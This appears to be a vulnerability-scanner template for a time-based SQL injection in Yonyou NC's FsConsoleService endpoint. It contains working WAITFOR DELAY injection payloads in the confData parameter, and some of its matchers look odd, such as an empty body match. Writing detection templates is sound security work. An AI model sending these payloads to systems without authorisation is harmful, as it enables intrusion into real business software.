id: poc-yaml-yongyou-nc-fsconsoleservice-sqli
info:
  name: "用友 NC FsConsoleService SQL 注入漏洞"
  author: ProjectDiscoveryAI
  severity: high
  tags: 用友NC
  metadata:
    product: 用友NC

flow: http(1) && http(2)

http:
  - id: initial-check
    method: GET
    path:
      - "{{BaseURL}}/index.jsp"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "Yonyou NC"

  - id: sqli-check
    method: GET
    path:
      - "{{BaseURL}}/servlet/~uapbs/uap.pub.fs.console.FsConsoleService?confData=guid%3d233%27;WAITFOR+DELAY+%270:0:5%27--+&operType=filterLog"
      - "{{BaseURL}}/servlet/~uapbs/uap.pub.fs.console.FsConsoleService?confData=guid%3d233%27;WAITFOR+DELAY+%270:0:8%27--+&operType=filterLog"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: header
        words:
          - ".server"
      - type: word
        part: body
        words:
          - ""
      - type: dsl
        dsl:
          - 'duration_1>=5 && duration_1<=6'
          - 'duration_2 - duration_1 >2'
        condition: and
